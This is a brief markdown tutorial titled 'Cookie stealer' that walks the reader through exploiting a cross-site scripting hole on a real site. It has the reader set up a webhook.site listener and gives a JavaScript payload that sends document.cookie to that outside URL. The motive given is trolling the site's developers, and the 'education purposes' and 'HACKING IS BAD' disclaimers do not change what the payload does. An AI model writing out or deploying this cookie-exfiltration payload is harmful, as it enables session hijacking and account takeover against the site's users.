# Cookie stealer
This article is for education purposes.<br><br>
Your on your favorite site, when Boom! You find an XSS point. And because your a nuisance to society, you decide to exploit it, to troll those nasty devs.
## How to started
for this tutorial, first use a tool, for example, (https://webhook.site/)[Webhook.site], it should be able to track all the visits, and the params you send to it!
## Now what?
After you got yourself suited, you will exloit the xss to add something with your webhook, such as:
```javascript
fetch(webhook-url? + document.cookie)
```
Ill use:
```javascript
fetch('https://webhook.site/13da85f1-7bc4-4af2-940a-6b0f9c22bd4b?' + document.cookie)
```
Now, anyone who commits to the xss, such as a img onload, it will run this, exposing your cookie to an online attack. Stay safe. <br><b>HACKING IS BAD!!!! ONLY DO IT ETHICALLY!!!</b>